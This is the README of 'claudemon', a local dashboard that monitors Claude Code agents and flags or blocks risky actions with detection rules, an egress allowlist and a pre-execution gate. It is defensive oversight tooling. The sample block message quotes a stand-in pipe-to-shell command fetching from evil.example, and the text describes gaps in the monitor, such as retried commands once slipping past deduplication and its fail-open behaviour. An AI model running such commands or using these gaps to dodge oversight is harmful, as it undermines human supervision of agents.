# claudemon

Near-real-time monitoring of Claude Code: reasoning, tool calls, tool results,
token usage, spawned processes, network connections and debug logs — in one
local dashboard.

Pure Python standard library. No dependencies, no install, macOS/Linux.

```bash
./claudemon.py --open
```

Dashboard on <http://127.0.0.1:8787> (loopback only by default).

## What it watches

| Pane | Source | Latency |
|---|---|---|
| **Reasoning / output / tools / results / tokens** | `~/.claude/projects/*/<session>.jsonl`, tailed by byte offset | ~0.25 s |
| **Subagents** | `<project>/<sessionId>/subagents/agent-*.jsonl` + `.meta.json` | ~0.25 s |
| **Process tree** | `ps` every 1 s, diffed for spawn/exit | ~1 s |
| **Network** | `lsof -i` over the Claude process tree, diffed for open/close | ~2 s |
| **Sessions** | `~/.claude/sessions/*.json` + recent transcripts | ~2 s |
| **Debug log** | `~/.claude/debug/*.txt` (populated when Claude runs with `--debug`) | ~0.5 s |
| **Hooks** *(optional)* | Claude Code hooks POSTing to the monitor | sub-second |

Claude Code appends one JSON record per content block as a turn is produced, so
tailing the transcript shows thinking blocks and tool calls while the turn is
still running — not after it finishes.

Subagent (`Agent`/`Task`) transcripts are **not** written beside the session
transcript — they live one level deeper, at
`<project>/<parentSessionId>/subagents/agent-<agentId>.jsonl`, with a sibling
`.meta.json` holding the agent type, description and the `toolUseId` of the call
that spawned it. A one-level scan of the project directory misses them entirely.
Because these files appear *mid-run*, they are read from byte 0 when discovered,
while transcripts that already existed at startup are seeded at EOF — otherwise
an agent's opening records would be silently skipped.

The process tree is rooted at each `claude-code` process and every session pid,
then walked downward, so anything Claude spawns — Bash tool commands, MCP
servers, subagents, `ripgrep` — shows up with its depth, CPU and RSS. Network
rows are the sockets held by that same tree, with reverse DNS resolved off the
polling thread.

## Usage

```bash
./claudemon.py                    # web dashboard on :8787
./claudemon.py --open             # ...and open a browser
./claudemon.py --tui              # colourised live stream in the terminal
./claudemon.py --tui --json       # one JSON event per line (pipe into jq)
./claudemon.py --port 9000
./claudemon.py --include-desktop  # also watch the Claude desktop app's tree
```

Tuning:

| Flag | Default | Meaning |
|---|---|---|
| `--tail-interval` | `0.25` | transcript poll seconds |
| `--proc-interval` | `1.0` | `ps` poll seconds |
| `--net-interval` | `2.0` | `lsof` poll seconds |
| `--max-age` | `1800` | how stale a transcript can be and still count as a session |
| `--ring` | `4000` | events retained for replay on reconnect |
| `--debug-glob` | – | extra log glob to tail (repeatable) |
| `--no-transcript` / `--no-debug-log` | – | disable a collector |
| `--host` | `127.0.0.1` | **binding off loopback exposes your prompts and reasoning to the network** |

## History tab — the action graph

The **History** tab reconstructs a session as an explorable flow/tree: what was
asked, what Claude reasoned, every tool call, which subagents were spawned, and
the processes and network connections that followed.

Drag to pan, scroll to zoom, click a node to inspect it in full, `±` to fold a
branch. It opens on an overview — tool detail folded, older turns folded, and
any branch containing a subagent forced open, since those are usually the ones
worth looking at.

Edges are built from four correlations, and the graph is explicit about which
are real and which are guesses:

| Edge | Basis | Certainty |
|---|---|---|
| `tool_result` → `tool_use` | `toolUseId` | exact |
| subagent → the `Agent` call that spawned it | `toolUseId` in the agent's `.meta.json` | exact |
| process → the `Bash` call that spawned it | nearest preceding Bash within 180 s | **inferred** |
| connection → tool/turn | nearest preceding node within 120 s | **inferred** |

Inferred edges render **dashed**, and their detail panel carries a "time-
correlated, not a recorded causal link" banner. The transcript does not record
that a given `du` came from a given Bash call — a 1 s `ps` poll and a timestamp
is the evidence, so the UI says so rather than implying more than it knows.

Process and network history comes from `data/events-YYYYMMDD.jsonl`, written by
the recorder, so it only covers **time the monitor was running**. Reasoning and
tool history is re-read from the transcripts and goes back as far as they do.
`--no-record` disables persistence; `--data-dir` moves it.

## Cyber tab — behavioural detection

A ruleset over everything the monitor already sees, flagging agent behaviour
that could lead to a security incident. **Detection, not judgement**: a finding
means *this happened and a human should be able to see it*, not *this was
malicious* or *this was unauthorised*. An authorised pentest and a compromise
produce identical telemetry — the point is that neither passes unseen.

42 rules across: credential access, credential exposure, exfiltration,
destructive operations, persistence, privilege escalation, defence evasion,
execution, lateral movement, discovery, collection, prompt injection, scope
violation, and command-and-control. Each carries a severity, an ATT&CK
technique, why it matters, and what to check.

Findings are attributed to the **actor** — main session or a named subagent — so
"which agent did this" is answerable.

Three correlation rules need state and so live in code rather than the JSON:

| Rule | Fires when |
|---|---|
| `CHAIN-001` | credential access followed by egress inside 180 s — the exfiltration sequence |
| `CHAIN-002` | 4+ distinct credential stores touched in 300 s — harvesting, not task-driven reads |
| `CHAIN-003` | 120+ discovery actions in 60 s — fast host mapping |

Rules live in [rules/default.json](rules/default.json) and are editable without
touching code. `--rules <path>` loads your own; `--no-rules` disables the
engine. On startup the ruleset is replayed over existing history so the tab is
populated immediately (`--no-backfill` to skip).

```bash
python3 tests/test_rules.py
```

37 cases pinning both directions — known-bad must fire, known-good must stay
quiet. Every "must stay quiet" case is a false positive that actually occurred
during development. Run it after editing rules.

### Auditing the ruleset

```bash
python3 tests/audit_rules.py
```

Answers four things the unit tests do not: can every rule ever fire given its
targets and scan scope; is every rule exercised by a detection case; which rules
fire on a corpus of ordinary development commands; and are any patterns
structurally suspect. Run it after editing rules.

The dead-rule check is worth knowing about: a rule with `scan: "content"` and
`targets: ["proc"]` can never match, because a process event has no content
haystack. That is silent — the rule simply never fires — so it is checked
mechanically rather than by reading.

### Tuning notes

The first run over one real session produced 42 findings, of which 31 were false
positives. What caused them is worth knowing before you write rules of your own:

- **Command rules matched file contents.** Writing source code that mentions
  `rm` flagged a deletion; a JS variable named `ag` flagged a secret hunt.
  Haystacks are now split into `command` and `content` scopes, and a rule
  declares which it wants via `"scan"`.
- **Shell metacharacters inside strings.** `echo "$f => ok"` read as a
  redirect, making read-only enumeration look like persistence. Same for
  `2>/dev/null`.
- **Case-insensitive flags.** `-F` matched the `-f` in `pgrep -f`. Flag patterns
  now set `"caseSensitive": true`.
- **Bare tool names.** `du /opt/homebrew/Cellar/arp-scan` flagged a network
  scan. Tool-name rules now require command position.
- **Regex greed.** `python3?` let `python` match so the `-c` exclusion never
  applied; `curl … | python3 -c` is parsing data, not executing remote code.

### Known limits

- **Observation only.** claudemon does not block. Hooks could (a `PreToolUse`
  hook exiting non-zero stops a call) but that is deliberately not wired up —
  the brief is to highlight, not to gate.
- **Self blind spot.** Writes to claudemon's own directory are not scanned,
  otherwise editing the ruleset flags every pattern at once. It is keyed on the
  *path being written*, not on command text — an earlier substring version let
  any command opt out of detection just by naming a monitor file.
- **Attack patterns as data still fire.** A command that *contains* `secretsdump`
  as text — writing a ruleset via a heredoc, for instance — is command-scoped and
  will alert. That is arguably correct; it is also visible in the sample findings.
- **Process and network attribution is time-correlated**, with the same caveat as
  the History tab.
- **Retrospective coverage is bounded by the recorder** for process/network
  rules: they only see time the monitor was running.

## Shield — countermeasures

Response actions against the agent's own process tree, controlled from the Cyber
tab. **Off by default.** Configuration lives in [shield.json](shield.json).

| Action | Mechanism | Reversible |
|---|---|---|
| `freeze` | `SIGSTOP` the process | yes — `resume` sends `SIGCONT` |
| `resume` | `SIGCONT` | – |
| `kill` | `SIGTERM`, grace period, then `SIGKILL` | no |
| `sinkhole` | blocklist the host; enforce at the process level | yes — `unsinkhole` |

**Freeze is the right first move.** It stops the process dead without losing
anything, so a human can look at what it was doing before deciding. Kill is
there when you need it, but it destroys state.

### Modes

| Mode | Behaviour |
|---|---|
| `off` | no evaluation, no actions |
| `monitor` | evaluates and logs **what it would do** — a dry run (default) |
| `armed` | actions actually execute |

```bash
python3 claudemon.py                     # shield.json decides (ships as monitor)
python3 claudemon.py --shield-mode armed # arm for this run
python3 claudemon.py --no-shield         # no countermeasures at all
```

Manual operator actions from the dashboard work in any non-`off` mode. Automatic
response to rule findings is a **separate** switch (`auto.enabled`, default
false) — arming the shield does not by itself let it act on its own. When it is
on, the action is chosen by `byRule` → `byCategory` → `bySeverity`.

### Egress allow / block list

One authoritative outbound policy, in `shield.json` under `egress`, editable
live from the Egress panel in the Cyber tab.

| Mode | Behaviour |
|---|---|
| `monitor` | classify and record, enforce nothing (default) |
| `blocklist` | deny what is listed, allow the rest — default-allow |
| `allowlist` | allow only what is listed, deny the rest — **default-deny** |

Entry forms:

```
1.2.3.4              exact IP            api.example.com   exact hostname
10.0.0.0/8           CIDR                *.example.com     domain + subdomains
160.79.104.          IP prefix           .example.com      same, shorthand
example.com:443      host and port       :4444             port, any host
*                    everything
```

**Precedence is fixed and does not depend on list order:**

```
never  >  block  >  allow  >  mode default
```

`never` is the reason an allowlist is safe to turn on. Without it, one typo in a
default-deny list strands the agent mid-task by cutting it off from its own
model API — and a control that breaks the thing it protects gets switched off
and stays off. Everything in `never` stays reachable whatever the lists say, and
an operator cannot sinkhole it by hand either. Ships with the model API,
loopback, IPv4 and IPv6 link-local.

Explicit `block` beats explicit `allow`, so a broad allow entry (`*.example.com`)
cannot silently re-permit a host you named as forbidden.

`onViolation` decides what happens when a blocked host is contacted: `alert`
(default), `freeze-owner`, or `kill-owner` — process-level, with the same
root/packet-filtering caveat as below. In `monitor` mode nothing is enforced;
violations are recorded as dry runs so you can build the lists against real
traffic first. `logAllowed` records permitted connections too, which is verbose
but the fastest way to assemble an allowlist.

The Network panel in the Live tab has per-row **✓ allow**, **✕ block** and
**🕳 sinkhole** buttons, so a policy can be built from what is actually
happening rather than guessed up front.

```bash
python3 tests/test_egress.py
```

46 cases covering every entry form, the precedence chain, all three modes, and
the case that matters most: an `allowlist` with `block: ["*"]` still leaves the
model API and loopback reachable. One bug it caught — `::1` was parsed as a
*port* entry, because it starts with a colon, so IPv6 loopback in the `never`
list protected nothing.

### About sinkholing

Packet-level blocking on macOS needs root, and **claudemon never runs `sudo`**.
So `sinkhole` does what is possible unprivileged, and is honest about the rest:

1. The host goes on a blocklist. When the agent tree contacts it again, the
   owning process is frozen or killed (`sinkhole.enforcement`). This is real,
   working enforcement — at process granularity, not packet granularity.
2. `pfctl` and `/etc/hosts` snippets are written to `data/shield-block.pf.conf`
   and `data/shield-block.hosts` for you to review and apply yourself.
3. If — and only if — you set `sinkhole.applyCommand` to a template of your own
   (backed by a sudoers entry you created), that command is run. It ships `null`.

### Safety rails

Applied in order, and every decision including every refusal is audited:

1. **Mode gate** — `off` does nothing; `monitor` is a dry run.
2. **Capability switches** — `allowKill`, `allowFreeze`, `allowSinkhole`.
3. **Target guards** — never pid ≤ 1; never the monitor; never outside the
   tracked agent tree (`requireInTree`); never the session's own process
   (`protectSessionProcess` — freezing it hangs your session, killing it ends
   your work); never a `protectPatterns` match (`launchd`, `WindowServer`,
   `sshd`, the Claude desktop app, claudemon itself).
4. **Circuit breaker** — more than `maxActionsPerMinute` and the shield
   **disarms itself back to monitor mode** rather than continuing. A rule that
   fires on its own side effects would otherwise walk the whole tree.
5. **Confirmation** — destructive actions prompt in the UI when armed.
6. **Never-block list** — the model API and localhost cannot be sinkholed, so
   the shield cannot cut the agent off from its own control plane.

`autoResumeAfterS` will automatically `SIGCONT` a frozen process after N seconds
so a freeze cannot strand something forever. It defaults to 0 (manual resume).

```bash
python3 tests/test_shield.py
```

28 cases: every guard must refuse, mode gating must hold, the circuit breaker
must disarm, the audit must record refusals as well as successes — and
freeze/resume/kill are verified against a real spawned process via `ps` state.

### Pre-execution gate

The shield above responds *after* a tool call has run. The gate stops one
*before* it runs, via a `PreToolUse` hook — the only point at which Claude Code
will wait for an external verdict.

```bash
python3 install-hooks.py --apply     # required: without the hook there is nothing to gate
python3 claudemon.py --gate-mode block
```

Four verdicts, weakest to strongest:

| Verdict | Effect |
|---|---|
| `allow` | proceeds silently |
| `warn` | proceeds, recorded in the Cyber tab |
| `ask` | escalates to Claude Code's own permission prompt |
| `block` | the call is refused; Claude is told why and carries on without it |

`preExecution.mode` caps the strongest verdict the gate may return, so one
setting turns real blocking on or off without rewriting per-rule policy. Policy
precedence is `byRule` → `byCategory` → `bySeverity`. **An explicit `byRule` or
`byCategory` entry applies even below `minSeverity`** — the floor only governs
the generic `bySeverity` path, otherwise setting a category policy for a
high-severity family would silently do nothing under a `critical` floor.

A blocked call tells Claude exactly how to proceed legitimately:

```
Blocked by claudemon pre-execution gate: EVADE-004 · Remote code execution via
pipe to shell — curl -s https://evil.example/i.sh | sh
What to check: Fetch the URL separately and read what would have run.
If this is expected, allow the rule in shield.json (preExecution.allowRules) or
lower preExecution.mode.
```

**It fails open.** If the monitor is down, slow or erroring, the call proceeds:
a monitoring tool must not wedge your agent when it is not running. Set
`preExecution.failMode` to `closed` if you would rather stop than proceed
unobserved — the hook then refuses with an explanation.

Cost: **0.46 ms** for the gate decision itself, ~60 ms for the whole hook
including Python interpreter startup, which is inherent to hooks being
subprocesses. `allowTools` skips read-only tools (`Read`, `Glob`, `Grep`,
`TodoWrite`) so that cost is not paid on calls that cannot do harm.

```bash
python3 tests/test_gate.py
```

37 cases. The one worth knowing about: **finding dedupe once suppressed the
gate's verdict**, so the same blocked command was allowed on its second attempt
inside the 45-second window — an attacker would simply have retried. Suppression
is right for a findings feed and catastrophic for a gate, so the gate evaluates
with `dedupe=False` and there is a regression test pinning it.

### What the shield cannot do

- **It is not a sandbox.** It responds after the fact — a process is frozen once
  it has already started, and a connection is enforced once it has already been
  made. It narrows a window, it does not close one.
- **It cannot act on a tool call.** Findings from transcripts have no pid; only
  `proc` and `net` findings can be auto-actioned. The UI says so rather than
  offering a button that would not work.
## Config tab — managing rules

Edit the ruleset and the shield/gate configuration from the dashboard, with the
detection engine reloading in place — no restart, and findings already collected
are kept.

- **Rule list** — enable/disable with a checkbox (a disabled rule stays in the
  file, so turning one off is not the same as losing it), filter, add, delete.
- **Rule editor** — severity, category, ATT&CK id, targets, scan scope, case
  sensitivity, write-only, match patterns, `not` exclusions, and the two prose
  fields that make a finding actionable.
- **Pattern tester** — paste a sample command and see, per pattern, what matched
  and whether the rule would fire. Given how much of the tuning work was regex
  behaviour, authoring a rule without this is guesswork.
- **Shield & gate** — the whole of `shield.json` as validated JSON.

Every write is guarded the same way: **validate, back up, write atomically,
reload**. An invalid ruleset is rejected before it touches disk, because a
config edit that leaves the detection engine dead is the one failure a security
tool must not have. The last 20 versions of each file are kept as
`*.bak.<timestamp>`.

Two settings are refused outright rather than merely warned about, since they
disable the guards that stop the shield hurting you:

- `safety.protectSessionProcess = false` — would let the shield freeze or kill
  the session that owns your work
- `safety.requireInTree = false` — would let it signal processes unrelated to
  the agent

## Dashboard

- **Filter chips** toggle event classes; the set is remembered in `localStorage`.
- **Session picker** (or clicking a session row) scopes the stream, process tree,
  network and token counters to one session.
- **`filter text…`** substring-matches across everything on screen.
- **follow / paused** controls autoscroll; long bodies are click-to-expand.

Token counters de-duplicate by `requestId` — Claude Code repeats the same usage
block on every content-block record of a request, so a naive sum over-counts.
Counts are raw tokens only; no pricing is applied.

## Hooks (optional, sub-second tool events)

Transcript tailing already catches everything, but hooks fire the moment a tool
is *requested*, and also surface `UserPromptSubmit`, `Notification`, `Stop` and
compaction events.

```bash
python3 install-hooks.py            # dry run — prints the proposed settings.json
python3 install-hooks.py --apply    # writes it, keeping a timestamped backup
python3 install-hooks.py --remove --apply
```

This edits `~/.claude/settings.json`. The hook script fails silent and always
exits 0, so Claude Code is never blocked or delayed when the monitor is down.
Restart your Claude Code sessions after applying.

## Layout

```
claudemon.py            entry point, CLI, TUI renderer
monitor/bus.py          pub/sub + replay ring buffer
monitor/sessions.py     session discovery, transcript resolution
monitor/transcript.py   jsonl tailer + record normalisation
monitor/procs.py        ps snapshot, tree walk, spawn/exit diff
monitor/net.py          lsof parse, connection diff, reverse DNS
monitor/debuglog.py     debug log tailer
monitor/rules.py        detection engine + correlation rules
monitor/shield.py       countermeasures, safety guards, audit
monitor/gate.py         pre-execution verdicts for PreToolUse
monitor/egress.py       outbound allow/block policy
monitor/config.py       validated config read/write with backups
monitor/server.py       HTTP + SSE + hook ingest
rules/default.json      the ruleset — edit in the Config tab, or here
shield.json             countermeasure + gate config — off by default
tests/test_rules.py     ruleset self-test (must-detect / must-stay-quiet)
tests/test_shield.py    shield safety tests (guards, modes, breaker, audit)
tests/test_gate.py      gate tests (verdicts, precedence, repeats, fail modes)
tests/test_egress.py    egress policy tests (entry forms, precedence, modes)
tests/audit_rules.py    ruleset audit (dead rules, coverage, FP rate, smells)
web/                    dashboard (no build step, no CDN)
hooks/claudemon_hook.py hook forwarder
install-hooks.py        settings.json installer/uninstaller
```

## API

| Endpoint | Returns |
|---|---|
| `GET /api/state` | sessions, process tree, connections |
| `GET /api/events?after=N` | SSE stream, replaying the ring from seq `N` |
| `GET /api/transcript?session=<id>&limit=200` | normalised tail of one transcript |
| `GET /api/history?session=<id>` | action graph: `{nodes:[{id,type,parent,t,…}], counts}` |
| `GET /api/findings?minSev=<0-4>` | rule findings + severity/category summary |
| `GET /api/rules` | the active ruleset |
| `GET /api/shield` | mode, capabilities, frozen pids, blocklist, action log |
| `POST /api/shield/mode` | `{mode}` or `{auto}` |
| `POST /api/shield/action` | `{action, target:{pid\|host}, reason}` |
| `POST /api/shield/egress` | `{op:add\|remove\|mode, list, entry, mode}` |
| `POST /api/gate` | pre-execution verdict for a proposed tool call |
| `GET /api/config` | ruleset, shield config, categories, backups |
| `POST /api/config/rules` \| `/shield` | validate, back up, write, reload |
| `POST /api/config/test` | try patterns against sample text |
| `POST /api/config/reload` \| `/restore` | reload from disk, or roll back to a backup |
| `POST /api/hook` | hook ingest |

## Notes

- Everything is read-only observation of local files and `ps`/`lsof` output.
  Nothing is sent anywhere; the server binds loopback.
- Transcripts contain your prompts, Claude's reasoning and full tool output.
  Treat the dashboard as sensitive.
- `lsof` shows sockets, not payloads — you get peer, port and state, not traffic
  contents (Claude's API traffic is TLS anyway).
